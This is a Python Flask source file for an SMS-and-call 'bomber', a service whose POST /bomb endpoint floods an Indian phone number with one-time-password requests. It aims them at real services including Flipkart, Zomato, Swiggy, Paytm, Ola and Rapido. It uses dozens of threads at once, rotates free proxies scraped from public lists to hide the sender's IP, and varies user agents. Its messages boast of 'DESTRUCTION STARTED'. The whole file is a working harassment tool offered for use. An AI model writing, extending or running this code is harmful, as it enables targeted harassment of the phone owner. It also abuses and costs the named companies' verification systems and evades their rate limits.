from flask import Flask, request, jsonify
import requests
import threading
import random
import time
from datetime import datetime

app = Flask(__name__)

# 2026 MAX HARD WORKING PROVIDERS (updated + more aggressive)
PROVIDERS = [
    # SMS - still somewhat alive or alternative flows
    {"name": "flipkart_new", "type": "sms", "url": "https://www.flipkart.com/api/5/user/otp/generate", "json": {"loginId": "91{phone}"}},
    {"name": "meesho_fast", "type": "sms", "url": "https://www.meesho.com/api/v1/otp", "json": {"mobile": "91{phone}"}},
    {"name": "zomato", "type": "sms", "url": "https://www.zomato.com/webroutes/auth/sendOtp", "json": {"phone": "91{phone}"}},
    {"name": "swiggy", "type": "sms", "url": "https://www.swiggy.com/api/v1/otp", "json": {"mobile": "91{phone}"}},
    {"name": "paytm", "type": "sms", "url": "https://accounts.paytm.com/signin/otp", "json": {"mobile": "91{phone}"}},
    # Extra aggressive ones from recent bombers
    {"name": "ajio", "type": "sms", "url": "https://www.ajio.com/api/v1/send-otp", "json": {"mobileNumber": "91{phone}"}},
    # CALL / Voice abuse (higher success rate abhi)
    {"name": "voice_1", "type": "call", "url": "https://api.olacabs.com/api/v1/otp", "json": {"phone": "91{phone}"}},
    {"name": "voice_2", "type": "call", "url": "https://api.rapido.bike/api/otp", "json": {"mobile": "91{phone}"}},
    # Add more from TBomb apidata.json if you pull latest — ye base hain
]

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
]

proxies_list = []

def scrape_proxies():
    global proxies_list
    new_proxies = []
    for src in PROXY_SOURCES:
        try:
            r = requests.get(src, timeout=10)
            for line in r.text.splitlines():
                line = line.strip()
                if ":" in line and not line.startswith("#"):
                    new_proxies.append(line)
        except:
            pass
    proxies_list = list(set(new_proxies))
    random.shuffle(proxies_list)
    print(f"✅ {len(proxies_list)} FRESH PROXIES LOADED — IP INVISIBLE")
    return proxies_list

def get_proxy():
    if not proxies_list or random.random() < 0.2:
        scrape_proxies()
    if proxies_list:
        p = random.choice(proxies_list)
        if p.startswith("socks"):
            return {"http": f"socks5://{p}", "https": f"socks5://{p}"}
        return {"http": f"http://{p}", "https": f"http://{p}"}
    return None

def get_ua():
    return random.choice([
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
    ])

def send_bomb(provider, phone):
    try:
        proxy = get_proxy()
        headers = {"User-Agent": get_ua()}
        payload = {}
        if "json" in provider:
            payload = {k: v.replace("{phone}", phone) for k, v in provider["json"].items()}
            r = requests.post(provider["url"], json=payload, headers=headers, proxies=proxy, timeout=7)
        else:
            payload = {k: v.replace("{phone}", phone) for k, v in provider.get("data", {}).items()}
            r = requests.post(provider["url"], data=payload, headers=headers, proxies=proxy, timeout=7)
        print(f"[{datetime.now()}] {provider['name']} ({provider['type']}) → 91{phone} | Status: {r.status_code}")
    except Exception as e:
        pass

def nuclear_combined_bomb(phone, count=2000):
    workers = 80
    threads = []
    for _ in range(count):
        prov = random.choice(PROVIDERS)
        t = threading.Thread(target=send_bomb, args=(prov, phone))
        threads.append(t)
        t.start()
        if len(threads) >= workers:
            for t in threads:
                t.join()
            threads = []
            time.sleep(0.05)  # max speed aggressive
    for t in threads:
        t.join()

@app.route('/bomb', methods=['POST'])
def launch():
    data = request.get_json(silent=True) or {}
    raw_phone = data.get("phone", "").strip()
    count = int(data.get("count", 1500))
    
    phone = ''.join(filter(str.isdigit, raw_phone))
    if len(phone) != 10:
        return jsonify({"error": "Sirf 10 digit number daal (jaise 6267591273)"}), 400
    
    print(f"🔥 MAX COMBINED SMS+CALL ATTACK LAUNCHED ON 91{phone} | {count} BOMBS")
    scrape_proxies()
    threading.Thread(target=nuclear_combined_bomb, args=(phone, count), daemon=True).start()
    
    return jsonify({
        "status": "DESTRUCTION STARTED — SMS + CALL COMBINED MAX HARD 🔥",
        "target": "91" + phone,
        "count": count,
        "proxies": len(proxies_list)
    })

@app.route('/', methods=['GET'])
def home():
    return jsonify({"message": "WORM FMCK VERCEL — POST /bomb with {\"phone\": \"6267591273\", \"count\": 2000}"})

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)
